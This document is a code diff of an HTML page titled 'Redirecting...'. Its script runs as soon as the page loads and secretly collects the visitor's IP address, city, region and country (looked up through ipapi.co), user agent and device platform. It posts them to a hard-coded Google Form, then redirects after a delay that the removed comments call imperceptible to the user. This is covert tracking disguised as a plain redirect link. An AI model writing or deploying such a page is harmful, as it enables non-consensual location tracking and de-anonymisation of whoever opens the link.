@@ -2,38 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    
-    <!-- 1. Meta tags to prevent caching -->
-    <!-- These tags instruct browsers and proxies not to store a copy of this page. -->
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-    <meta http-equiv="Pragma" content="no-cache" />
-    <meta http-equiv="Expires" content="0" />
-
     <title>Redirecting...</title>
+    <meta http-equiv="Cache-Control" content="no-cache">
     <script>
-        // The URL you want to redirect users to.
         const REDIRECT_URL = "https://example.com";
 
-        // This is the main function that captures data and handles the redirect.
-        const runTrackerAndRedirect = async () => {
-            // We schedule the redirect to happen after a very short delay.
-            // This gives the data capture process below a guaranteed window to execute.
-            // The 150ms delay is imperceptible to the user.
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 150);
+        const sendDataAndRedirect = async () => {
+            // A 200ms delay gives the script a reliable window to send the data
+            // before the redirect happens. This is the key to reliability.
+            setTimeout(() => window.location.href = REDIRECT_URL, 200);
 
             try {
-                // Fetch the location data from the external service.
                 const geoResponse = await fetch('https://ipapi.co/json/');
                 const geoData = await geoResponse.json();
 
-                // Prepare all the data points.
                 const timestamp = new Date().toISOString();
                 const userAgent = navigator.userAgent;
                 const os = navigator.platform;
 
-                // Get a more descriptive device name.
                 let deviceInfo = 'Unknown';
                 if (navigator.userAgentData) {
                     const platform = navigator.userAgentData.platform;
@@ -44,7 +30,6 @@
                     deviceInfo = `${navigator.platform} (${isMobile})`;
                 }
 
-                // Create the FormData object with your specific entry IDs.
                 const formData = new FormData();
                 formData.append("entry.1496883719", timestamp);
                 formData.append("entry.1535774579", geoData.ip);
@@ -53,30 +38,20 @@
                 formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
                 formData.append("entry.448354724", userAgent);
 
-                // Send the data to your Google Form.
                 await fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
                     method: "POST",
                     body: formData,
                     mode: "no-cors"
                 });
-
             } catch (err) {
-                // If any error occurs (e.g., ipapi.co is down), it will be logged
-                // in the browser's console, but the user will still be redirected.
                 console.error("Data capture failed, but redirecting anyway:", err);
             }
         };
 
-        // 2. Use the 'pageshow' event listener.
-        // This is the key to defeating the cache. It fires EVERY time a user lands on the page,
-        // including when they use the back/forward buttons, which a simple script load does not.
-        window.addEventListener('pageshow', (event) => {
-            // We run the main function every single time the page is displayed.
-            runTrackerAndRedirect();
-        });
+        // Call the function immediately when the script runs.
+        sendDataAndRedirect();
     </script>
 </head>
 <body>
-    <!-- The body is intentionally left empty for the fastest possible experience. -->
 </body>
 </html>
